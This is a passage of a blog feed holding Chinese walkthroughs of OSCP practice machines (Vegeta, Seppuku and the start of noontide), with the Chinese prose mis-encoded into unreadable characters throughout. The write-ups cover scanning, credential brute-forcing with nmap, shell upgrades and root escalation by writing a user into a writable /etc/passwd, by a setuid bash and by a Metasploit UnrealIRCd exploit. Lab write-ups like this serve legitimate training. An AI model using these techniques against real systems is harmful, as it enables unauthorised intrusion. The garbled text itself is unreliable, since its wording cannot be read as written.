--&gt;</span><br></pre></td></tr></table></figure><p>å¯¹å…¶äºŒæ¬¡base64è§£å¯†å‘ç°æ–‡ä»¶å¤´å­˜åœ¨png</p><p><img src="/img/OSCP-Vegeta/image-20240823140240105.png" alt="image-20240823140240105"></p><p>æ›´æ”¹pngåç¼€å‘ç°æ˜¯äºŒç»´ç ï¼ŒäºŒç»´ç è§£æå™¨æŸ¥çœ‹ç»™äº†ä¸€ä¸ªå¯†ç </p><img src="/img/OSCP-Vegeta/image-20240823141253722.png" alt="image-20240823141253722" style="zoom:150%;" /><p>ç°åœ¨å·®ä¸ªç”¨æˆ·åï¼Œcewl æ”¶é›†ä¸€æ³¢å…³é”®å­—</p><p><img src="/img/OSCP-Vegeta/image-20240823141446676.png" alt="image-20240823141446676"></p><p>å°è¯•ä¸€æ³¢çˆ†ç ´ï¼Œå¾ˆæ˜æ˜¾å¤±è´¥äº†</p><p><img src="/img/OSCP-Vegeta/image-20240823141755467.png" alt="image-20240823141755467"></p><h2 id="3ã€è¿›ä¸€æ­¥çš„ä¿¡æ¯æ”¶é›†"><a href="#3ã€è¿›ä¸€æ­¥çš„ä¿¡æ¯æ”¶é›†" class="headerlink" title="3ã€è¿›ä¸€æ­¥çš„ä¿¡æ¯æ”¶é›†"></a>3ã€è¿›ä¸€æ­¥çš„ä¿¡æ¯æ”¶é›†</h2><p>æˆ‘ä»¬ç”¨ä¸€ä¸ªå¤§ç‚¹çš„å­—å…¸å†æ¬¡åšäº†ç›®å½•æ‰«æï¼Œå‘ç°ä¸€ä¸ªæ–°çš„ç«¯ç‚¹</p><p><img src="/img/OSCP-Vegeta/image-20240823142923712.png" alt="image-20240823142923712"></p><p>é‡Œé¢æ˜¯ä¸€ä¸ªwav æ ¼å¼çš„æ–‡ä»¶ï¼Œæ˜¯ä¸ªéŸ³é¢‘</p><p><img src="/img/OSCP-Vegeta/image-20240823143037254.png" alt="image-20240823143037254"></p><p>æµ…å¬äº†ä¸€ä¸‹ï¼Œå˜€å˜€å˜€çš„æ–­ç‚¹å£°ï¼Œæ‘©æ–¯å¯†ç æ¬¸ï¼Œåœ¨çº¿è§£ç ä¸‹ï¼š<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">Morse Code Adaptive Audio Decoder | Morse Code World</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USER : TRUNKS PASSWORD : US3R&lt;KN&gt;S IN DOLLARS SYMBOL)</span><br></pre></td></tr></table></figure><p>æ¨æµ‹å¯†ç åº”è¯¥æ˜¯US3R è¿™éƒ¨åˆ†ï¼Œä½†æ˜¯å°è¯•å´æ˜¯å¤±è´¥çš„ï¼›</p><h1 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h1><p>ä¸¢ç»™AI åˆ†æä¸€ä¸‹</p><p><img src="/img/OSCP-Vegeta/image-20240823145642107.png" alt="image-20240823145642107"></p><p>æŠŠå¯†ç é‡Œé¢çš„Sæ”¹æˆç¾å…ƒ$ç¬¦å·ï¼Œå†æ¬¡å°è¯•</p><p><img src="/img/OSCP-Vegeta/image-20240823145918586.png" alt="image-20240823145918586"></p><p>æœç„¶ï¼ŒæˆåŠŸgetshell</p><p><img src="/img/OSCP-Vegeta/image-20240823145955199.png" alt="image-20240823145955199"></p><h1 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h1><h2 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h2><p>å†å²å‘½ä»¤ä¸­æœ‰ç‚¹ä¸œè¥¿æ˜‚</p><p><img src="/img/OSCP-Vegeta/image-20240823150051647.png" alt="image-20240823150051647"></p><p>æˆ‘æ˜¯å¦å¯ä»¥å‘&#x2F;etc&#x2F;passwd æ–‡ä»¶ä¸­å†™å…¥ç”¨æˆ·å‘¢ï¼Ÿ</p><p>æŸ¥çœ‹&#x2F;etc&#x2F;passwd æ–‡ä»¶çš„æƒé™</p><p><img src="/img/OSCP-Vegeta/image-20240823151134142.png" alt="image-20240823151134142"></p><p>å•Šï¼Ÿï¼Œtrunks ç”¨æˆ·å…·æœ‰&#x2F;etc&#x2F;passwd çš„è¯»å†™æƒé™ï¼Œé‚£è¿™å°±å¥½åŠäº†</p><h2 id="2ã€ææƒè‡³root"><a href="#2ã€ææƒè‡³root" class="headerlink" title="2ã€ææƒè‡³root"></a>2ã€ææƒè‡³root</h2><p>ç›´æ¥å‘&#x2F;etc&#x2F;passwd æ–‡ä»¶ä¸­å†™å…¥ç®¡ç†å‘˜ç”¨æˆ·</p><p><img src="/img/OSCP-Vegeta/image-20240823151653139.png" alt="image-20240823151653139"></p><p>æˆåŠŸææƒè‡³root</p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Seppuku</title>
      <link href="/2024/08/22/OSCP-Seppuku/"/>
      <url>/2024/08/22/OSCP-Seppuku/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”Seppuku"><a href="#OSCPç³»åˆ—é¶æœºâ€”Seppuku" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”Seppuku"></a>OSCPç³»åˆ—é¶æœºâ€”Seppuku</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-Seppuku/image-20240822200229186.png" alt="image-20240822200229186"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ¢æµ‹"><a href="#1ã€å¿«é€Ÿæ¢æµ‹" class="headerlink" title="1ã€å¿«é€Ÿæ¢æµ‹"></a>1ã€å¿«é€Ÿæ¢æµ‹</h3><p><img src="/img/OSCP-Seppuku/image-20240822200315169.png" alt="image-20240822200315169"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-Seppuku/image-20240822200410103.png" alt="image-20240822200410103"></p><p><img src="/img/OSCP-Seppuku/image-20240822200436648.png" alt="image-20240822200436648"></p><p>åŒæ—¶æ¢æµ‹UDPå¸¸ç”¨çš„20ä¸ªç«¯å£ï¼Œæ²¡æœ‰å‡†ç¡®çš„å¼€æ”¾ç«¯å£</p><h3 id="3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"><a href="#3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"></a>3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹</h3><p><img src="/img/OSCP-Seppuku/image-20240822200810277.png" alt="image-20240822200810277"></p><p>ç»™äº†å¾ˆå¤šç‰ˆæœ¬å’ŒæœåŠ¡çš„ä¿¡æ¯ï¼Œä»¥åŠæ¨æµ‹å­˜åœ¨äºlinux 4.x|5.x çš„ç‰ˆæœ¬ï¼Œç‰ˆæœ¬è¾ƒé«˜</p><p>80ç«¯å£çš„HTTPæœåŠ¡æç¤º401æœªæˆæƒï¼Œ7080å¼€æ”¾åœ¨ä¸€ä¸ªæºå¸¦ssl çš„httpæœåŠ¡ï¼Œ7601ã€8088éƒ½å¼€æ”¾äº†ä¸€ä¸ªhttpæœåŠ¡</p><h3 id="4ã€æ¼æ´æ¢æµ‹"><a href="#4ã€æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€æ¼æ´æ¢æµ‹"></a>4ã€æ¼æ´æ¢æµ‹</h3><p><img src="/img/OSCP-Seppuku/image-20240822201455333.png" alt="image-20240822201455333"></p><p>åœ¨80ç«¯å£æ˜¾ç¤ºå¾ˆå¤šç›®å½•æ–‡ä»¶ï¼Œä½†æ˜¯éƒ½ç»™å‡º401 æœªæˆæƒæç¤º</p><p><img src="/img/OSCP-Seppuku/image-20240822202031346.png" alt="image-20240822202031346"></p><p>7080ç«¯å£ç»™å‡ºä¸€ä¸ªempowerid æœåŠ¡ï¼Œç½‘æŸ¥äº†ä¸€ä¸‹ï¼Œå¯ä»¥æœç´¢å®˜ç½‘æ·±å…¥äº†è§£</p><blockquote><p>EmpowerID æ˜¯ä¸€æ¬¾èº«ä»½ç®¡ç†å’Œè®¿é—®æ§åˆ¶è§£å†³æ–¹æ¡ˆï¼Œå®ƒæä¾›äº†ä¸€å¥—å…¨é¢çš„æœåŠ¡æ¥å¸®åŠ©ä¼ä¸šå®‰å…¨åœ°ç®¡ç†ç”¨æˆ·çš„èº«ä»½å’Œè®¿é—®æƒé™ã€‚</p></blockquote><p>è¿™é‡Œnmapç»™å‡ºäº†CVE-2010-2333 çš„æ¼æ´ï¼Œè¡¨æ˜è¿™ä¸ªæœåŠ¡å­˜åœ¨ä¸€ä¸ªæºä»£ç æ³„éœ²çš„CVEç¼–å·æ¼æ´ï¼Œåœ¨åé¢çš„æ¸—é€è¿‡ç¨‹ä¸­å¯èƒ½å­˜åœ¨åˆ©ç”¨</p><p><img src="/img/OSCP-Seppuku/image-20240822202631798.png" alt="image-20240822202631798"></p><p>8088 ç«¯å£ç»™å‡ºäº†ä¸€ä¸ªæ˜“å—DOsæ”»å‡»çš„è–„å¼±ç‚¹ï¼Œå†æ¬¡ç»™å‡ºäº†CVE-2010-2333 çš„æ¼æ´ï¼Œå¹¶åœ¨åé¢ç»™å‡ºäº†ä¸€ä¸ªhtml é¡µé¢çš„æºä»£ç </p><p><img src="/img/OSCP-Seppuku/image-20240822202904756.png" alt="image-20240822202904756"></p><p>åœ¨é’ˆå¯¹ä¸»æœºçš„è„šæœ¬æ‰«æä¸­ï¼ŒæŒ‡å‡ºsmbæœåŠ¡æ˜“å—<code>smb-vuln-regsvc-dos</code>æ”»å‡»ï¼Œæ˜“å—æ‹’ç»æœåŠ¡è€Œå´©æºƒ</p><h2 id="ä¸‰ã€FTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€FTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€FTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€FTPä¿¡æ¯æ”¶é›†</h2><p>nmapå¹¶æœªæ‰«æå‡ºftp å­˜åœ¨æœªæˆæƒï¼Œå°è¯•æœªæˆæƒç™»é™†</p><p><img src="/img/OSCP-Seppuku/image-20240822203433673.png" alt="image-20240822203433673"></p><p>ä¸èƒ½ç™»é™†</p><h2 id="å››ã€SMBä¿¡æ¯æ”¶é›†"><a href="#å››ã€SMBä¿¡æ¯æ”¶é›†" class="headerlink" title="å››ã€SMBä¿¡æ¯æ”¶é›†"></a>å››ã€SMBä¿¡æ¯æ”¶é›†</h2><p><img src="/img/OSCP-Seppuku/image-20240822204635390.png" alt="image-20240822204635390"></p><p>SMBä¹Ÿæ²¡æœ‰å¯åˆ©ç”¨çš„ç‚¹</p><h2 id="äº”ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#äº”ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="äº”ã€HTTPä¿¡æ¯æ”¶é›†"></a>äº”ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€80ç«¯å£"><a href="#1ã€80ç«¯å£" class="headerlink" title="1ã€80ç«¯å£"></a>1ã€80ç«¯å£</h3><p><img src="/img/OSCP-Seppuku/image-20240822205201852.png" alt="image-20240822205201852"></p><p>ä¸€ä¸ªæˆæƒçš„ç™»é™†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“è´¦å·å¯†ç </p><p>è®©nmap è¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=http-brute -p80 192.168.31.83</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Seppuku/image-20240822210021953.png" alt="image-20240822210021953"></p><p>æœªå‘ç°è´¦å·å¯†ç ï¼Œä¹‹å‰nmap ç»™å‡ºç›®å½•æ‰«æç»“æœä¸­éƒ½æ˜¯401çš„æœªæˆæƒï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰åšç›®å½•æ‰«æçš„å¿…è¦äº†</p><h3 id="2ã€7080ä¿¡æ¯æ”¶é›†"><a href="#2ã€7080ä¿¡æ¯æ”¶é›†" class="headerlink" title="2ã€7080ä¿¡æ¯æ”¶é›†"></a>2ã€7080ä¿¡æ¯æ”¶é›†</h3><p><img src="/img/OSCP-Seppuku/image-20240822210121246.png" alt="image-20240822210121246"></p><p>ä¸€ä¸ª404çš„é¡µé¢ï¼Œä½†æ˜¯åœ¨nmapæ‰«æä¸­ç»™å‡ºLiteSpeed webæœåŠ¡ï¼Œä¸‹é¢å¯¹è¿™ä¸ªè½¯ä»¶åšä¸€ä¸ªç®€å•çš„ä»‹ç»</p><blockquote><p>LiteSpeed Web Server (LSWS) æ˜¯ä¸€æ¬¾ä»¥å¿«é€Ÿæ€§èƒ½å’Œé«˜å¯æ‰©å±•æ€§è€ŒçŸ¥åçš„ä¸“æœ‰ç½‘ç»œæœåŠ¡å™¨è½¯ä»¶ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†ä¸€æµçš„å®‰å…¨æ€§ï¼Œä¾‹å¦‚å†…ç½®åŠŸèƒ½æœ‰åŠ©äºé˜²æ­¢åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡ï¼ˆDDOSï¼‰æ”»å‡» ã€‚å®ƒä¸å¹¿æ³›ä½¿ç”¨çš„Apacheç½‘ç»œæœåŠ¡å™¨å®Œå…¨å…¼å®¹ï¼Œè¿™æ„å‘³ç€ç”¨æˆ·å¯ä»¥åœ¨ä¸æ”¹å˜ç°æœ‰åº”ç”¨ç¨‹åºæˆ–æ“ä½œç³»ç»Ÿçš„æƒ…å†µä¸‹ï¼Œæ— ç¼åˆ‡æ¢åˆ°LiteSpeed ã€‚</p></blockquote><p>åšä¸€ä¸ªç›®å½•æ‰«æ</p><p><img src="/img/OSCP-Seppuku/image-20240822210918213.png" alt="image-20240822210918213"></p><p><img src="/img/OSCP-Seppuku/image-20240822210930494.png" alt="image-20240822210930494"></p><p><strong>OpenLiteSpeed Web Server 1.6</strong> æ˜¯å¦å­˜åœ¨æ¼æ´å‘¢</p><p><img src="/img/OSCP-Seppuku/image-20240822211139116.png" alt="image-20240822211139116"></p><p>è¿™å‡ ä¸ªç‰ˆæœ¬ä¸å¯¹åº”</p><h3 id="3ã€7601ä¿¡æ¯æ”¶é›†"><a href="#3ã€7601ä¿¡æ¯æ”¶é›†" class="headerlink" title="3ã€7601ä¿¡æ¯æ”¶é›†"></a>3ã€7601ä¿¡æ¯æ”¶é›†</h3><p><img src="/img/OSCP-Seppuku/image-20240822212239814.png" alt="image-20240822212239814"></p><p>é¦–é¡µä¸€å¼ å›¾ï¼Œå›¾ç‰‡ä¹Ÿæ²¡æœ‰éšè—çš„ä¿¡æ¯ï¼›åšç›®å½•æ‰«æ</p><p><img src="/img/OSCP-Seppuku/image-20240822212703788.png" alt="image-20240822212703788"></p><p>çœ‹æ•æ„Ÿç›®å½•çš„æ—¶å€™å‘ç°</p><p><img src="/img/OSCP-Seppuku/image-20240822212749645.png" alt="image-20240822212749645"></p><p>ç¿»åˆ°shadow.bak çš„å¤‡ä»½æ–‡ä»¶ï¼Œä¸è¿‡è¿™ä¸ªæ•£åˆ—å€¼ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“ç ´è§£çš„å•Šï¼Œä½†æ˜¯ä¸Šé¢å¥½åƒè¿˜æœ‰ä¸ªpassword.lst æ–‡ä»¶</p><p><img src="/img/OSCP-Seppuku/image-20240822214537146.png" alt="image-20240822214537146"></p><p>å•Šï¼Ÿæ˜¯ä¸æ˜¯æœ‰ç‚¹è¿‡åˆ†äº†ï¼Œç”šè‡³è¿˜æœ‰ä¸ªpasswd.bak çš„å¤‡ä»½æ–‡ä»¶ï¼Œåšä¸ªçˆ†ç ´</p><p><img src="/img/OSCP-Seppuku/image-20240822214937702.png" alt="image-20240822214937702"></p><p>æ²¡æœ‰æ¬¸ï¼Œç”¨å…¶ä»–çš„ç›®å½•æ‰«æå·¥å…·</p><p><img src="/img/OSCP-Seppuku/image-20240822223836580.png" alt="image-20240822223836580"></p><p>å‘ç°å¤šäº†å‡ ä¸ªå…¶ä»–çš„è·¯å¾„</p><h2 id="å…­ã€Getshell"><a href="#å…­ã€Getshell" class="headerlink" title="å…­ã€Getshell"></a>å…­ã€Getshell</h2><p>å¯¹ shadow.bak ä¸­çš„ <code>rabbit-hole</code> çš„ç”¨æˆ·åå¯†ç è¿›è¡Œçˆ†ç ´</p><p><img src="/img/OSCP-Seppuku/image-20240822215455478.png" alt="image-20240822215455478"></p><p>OKå•Šï¼Œéå¸¸çš„å¿«é€Ÿä¸”ç²¾å‡†</p><p><img src="/img/OSCP-Seppuku/image-20240822215822915.png" alt="image-20240822215822915"></p><p>ä½†æ˜¯ï¼Œæ‹‰è·¨äº†ï¼Œå¯†ç ä¸å¯¹ï¼Œåº”è¯¥æ˜¯è¢«æ”¹æ‰äº†ï¼Œçœ‹æ¥è¿™ä¸ª<code>r@bbit-hole</code>ç”¨æˆ·ç™»é™†ä¸äº†äº†</p><p>æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ª <code>hostname</code>æ²¡ç”¨</p><p><img src="/img/OSCP-Seppuku/image-20240822220435169.png" alt="image-20240822220435169"></p><p>æˆåŠŸgetshell</p><p><img src="/img/OSCP-Seppuku/image-20240822220603505.png" alt="image-20240822220603505"></p><h2 id="ä¸ƒã€æƒé™æå‡"><a href="#ä¸ƒã€æƒé™æå‡" class="headerlink" title="ä¸ƒã€æƒé™æå‡"></a>ä¸ƒã€æƒé™æå‡</h2><h3 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h3><p>æˆ‘ä»¬éœ€è¦ä¼˜åŒ–æˆ‘ä»¬çš„shellï¼Œåé¢æ¯ä¸€ä¸ªéƒ½éœ€è¦ä¼˜åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Seppuku/image-20240822220653308.png" alt="image-20240822220653308"></p><p>è¿™ä¸ªæ–‡ä»¶æœ‰ç‚¹æ„æ€æ˜‚ï¼Œå°è¯•ç™»é™†åˆ°å…¶ä»–ç”¨æˆ·</p><h3 id="2ã€ææƒè‡³samurai"><a href="#2ã€ææƒè‡³samurai" class="headerlink" title="2ã€ææƒè‡³samurai"></a>2ã€ææƒè‡³samurai</h3><p><img src="/img/OSCP-Seppuku/image-20240822222951615.png" alt="image-20240822222951615"></p><p>æŸ¥æ‰¾ææƒä¿¡æ¯</p><p><img src="/img/OSCP-Seppuku/image-20240822223938600.png" alt="image-20240822223938600"></p><p>è¿™é‡Œæœ‰ç‚¹é¸¡è‚‹æ˜‚</p><h3 id="3ã€ææƒè‡³tanto"><a href="#3ã€ææƒè‡³tanto" class="headerlink" title="3ã€ææƒè‡³tanto"></a>3ã€ææƒè‡³tanto</h3><p>å›åˆ°ä¹‹å‰çš„ç›®å½•æ‰«æä¸­å‘ç°çš„keysè·¯å¾„ï¼Œå‘ç°äº†æŸä¸ªsshå¯†é’¥</p><p><img src="/img/OSCP-Seppuku/image-20240822224005623.png" alt="image-20240822224005623"></p><p>å°è¯•ç”¨å¯†é’¥è¿æ¥</p><p><img src="/img/OSCP-Seppuku/image-20240822224154473.png" alt="image-20240822224154473"></p><p>æˆåŠŸææƒè‡³tanto</p><h3 id="4ã€ææƒè‡³root"><a href="#4ã€ææƒè‡³root" class="headerlink" title="4ã€ææƒè‡³root"></a>4ã€ææƒè‡³root</h3><p>æˆ‘ä»¬å»åˆ›å»º <code>home/tanto/.cgi_bin/bin</code> æ–‡ä»¶ï¼Œå†™å…¥+s çš„ &#x2F;bin&#x2F;bash</p><p><img src="/img/OSCP-Seppuku/image-20240822230148400.png" alt="image-20240822230148400"></p><p>ç›´æ¥ææƒè‡³root</p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-noontide</title>
      <link href="/2024/08/22/OSCP-noontide/"/>
      <url>/2024/08/22/OSCP-noontide/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”InfosecPrep"><a href="#OSCPç³»åˆ—é¶æœºâ€”InfosecPrep" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”InfosecPrep"></a>OSCPç³»åˆ—é¶æœºâ€”InfosecPrep</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-noontide/image-20240822125212542.png" alt="image-20240822125212542"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><p><img src="/img/OSCP-noontide/image-20240822125308279.png" alt="image-20240822125308279"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-noontide/image-20240822125440942.png" alt="image-20240822125440942"></p><p>æ¢æµ‹å…¨tcp ç«¯å£ï¼Œå¹¶æ¢æµ‹å¸¸ç”¨çš„20ä¸ªUDPç«¯å£</p><p><img src="/img/OSCP-noontide/image-20240822125518212.png" alt="image-20240822125518212"></p><p>tcp æœ‰å‡ ä¸ªé™Œç”Ÿçš„åè®®ï¼ŒudpåŸºæœ¬ä¸Šå¤„äºå…¨å…³é—­çŠ¶æ€</p><p>ä¸Šç½‘æœå¯»äº†æœ‰å…³IRC åè®®çš„ä¿¡æ¯</p><blockquote><p>IRCï¼Œå³Internet Relay Chatï¼ˆäº’è”ç½‘ä¸­ç»§èŠå¤©ï¼‰ï¼Œæ˜¯ä¸€ç§ç”¨äºåœ¨çº¿é€šä¿¡çš„åè®®ã€‚å®ƒå…è®¸ç”¨æˆ·åœ¨å®æ—¶ç¯å¢ƒä¸­é€šè¿‡æ–‡æœ¬æ¶ˆæ¯è¿›è¡Œäº¤æµã€‚IRC åè®®æœ€åˆåœ¨1988å¹´ç”±Jarkko Oikarinenåˆ›å»ºï¼Œä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æä¾›ä¸€ä¸ªå¤šç”¨æˆ·å®æ—¶èŠå¤©ç³»ç»Ÿã€‚ç”¨æˆ·å¯ä»¥åŠ å…¥ä¸åŒçš„â€œé¢‘é“â€æˆ–â€œæˆ¿é—´â€ï¼Œåœ¨é‚£é‡Œä¸å…¶ä»–äººè¿›è¡Œäº¤æµã€‚</p></blockquote><h3 id="3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"><a href="#3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"></a>3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹</h3><p><img src="/img/OSCP-noontide/image-20240822131001560.png" alt="image-20240822131001560"></p><p>ç»™äº†æˆ‘ä»¬IRCåè®®çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå’Œä¸€ä¸ªAdmin ç”¨æˆ·å’Œ ä¸€ä¸ªé‚®ç®±ï¼Œä¸è¿‡å¥½åƒæ²¡å•¥ç”¨æ˜‚ï¼›æ¨æµ‹å¯èƒ½çš„ç‰ˆæœ¬åœ¨ Linux 3.5æˆ–Linux 3.1 çš„å¯èƒ½æ€§å¤§ï¼Œç³»ç»Ÿç‰ˆæœ¬è¾ƒä½ï¼Œå¯èƒ½å­˜åœ¨è„ç‰›ææƒ</p><h3 id="4ã€æ¼æ´æ¢æµ‹"><a href="#4ã€æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€æ¼æ´æ¢æµ‹"></a>4ã€æ¼æ´æ¢æµ‹</h3><p><img src="/img/OSCP-noontide/image-20240822131302680.png" alt="image-20240822131302680"></p><p>æ²¡å•¥æ¶ˆæ¯</p><h2 id="ä¸‰ã€IRCåè®®GETshell"><a href="#ä¸‰ã€IRCåè®®GETshell" class="headerlink" title="ä¸‰ã€IRCåè®®GETshell"></a>ä¸‰ã€IRCåè®®GETshell</h2><p>æœ‰å…´è¶£å¯ä»¥åœ¨åœ¨kali ä¸­å®‰è£…irrsi çš„IRC å®¢æˆ·ç«¯å·¥å…·å¯åŠ¨</p><p><img src="/img/OSCP-noontide/image-20240822131554883.png" alt="image-20240822131554883"></p><p>ç¬¬ä¸€æ¬¡å¯åŠ¨ä¼šç»™æˆ‘ä»¬å¾ˆå¤šçš„ä¿¡æ¯ï¼Œè¡¨ç¤ºå¦‚æœä½ æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨å¯ä»¥å»å®˜ç½‘çœ‹ä¸€çœ‹ä½¿ç”¨æ‰‹å†Œï¼Œ<code>/HELP</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ã€‚</p><p>ä¸è¿‡æˆ‘ä»¬çš„é‡ç‚¹ä¸åœ¨è¿™é‡Œï¼Œé‡ç‚¹æ˜¯æˆ‘ä»¬å¯ä»¥æœç´¢æœ‰å…³IRCåè®®çš„æ¼æ´</p><p><img src="/img/OSCP-noontide/image-20240822134811048.png" alt="image-20240822134811048"></p><p>åœ¨MSFä¸­æœç´¢æœ‰å…³UnrealIRCd ç‰ˆæœ¬çš„æ¼æ´ï¼Œå‡ºæ¥ä¸€ä¸ªï¼Œè¡¨ç¤º UnrealIRCD 3.2.8.1 å­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ï¼Œnmapå¹¶æ²¡æœ‰æ¢æµ‹å‡ºå‡†ç¡®çš„ç‰ˆæœ¬å·ï¼Œåªèƒ½å°è¯•è·å–shell</p><p><img src="/img/OSCP-noontide/image-20240822135717678.png" alt="image-20240822135717678"></p><p>ä¿®æ”¹payload è½½è·ï¼Œé…ç½®æœ¬åœ°ç›‘å¬ç«¯å£</p><p><img src="/img/OSCP-noontide/image-20240822135735967.png" alt="image-20240822135735967"></p><p>å°è¯•æ”»å‡»ï¼ŒæˆåŠŸè·å–shell</p><p><img src="/img/OSCP-noontide/image-20240822135806481.png" alt="image-20240822135806481"></p><h2 id="å››ã€æƒé™æå‡"><a href="#å››ã€æƒé™æå‡" class="headerlink" title="å››ã€æƒé™æå‡"></a>å››ã€æƒé™æå‡</h2><h3 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h3><p>ä¼˜åŒ–æˆ‘ä»¬çš„shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾ä¿¡æ¯ï¼Œæœ¬ä»¥ä¸ºç³»ç»Ÿç‰ˆæœ¬è¾ƒä½ï¼Œå¯èƒ½å­˜åœ¨è„ç‰›ææƒï¼Œä½†æ˜¯ä¸€æŸ¥çœ‹ï¼Œå‘ç°ç‰ˆæœ¬è¿˜æŒºé«˜ï¼Œçœ‹æ¥nmapæœ‰æ—¶å€™è¯†åˆ«çš„åå·®è¾ƒå¤§</p><p><img src="/img/OSCP-noontide/image-20240822142051184.png" alt="image-20240822142051184"></p><h3 id="2ã€ææƒè‡³root"><a href="#2ã€ææƒè‡³root" class="headerlink" title="2ã€ææƒè‡³root"></a>2ã€ææƒè‡³root</h3><p>ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾ï¼Œsuidã€sudoã€è®¡åˆ’ä»»åŠ¡å‡æ— 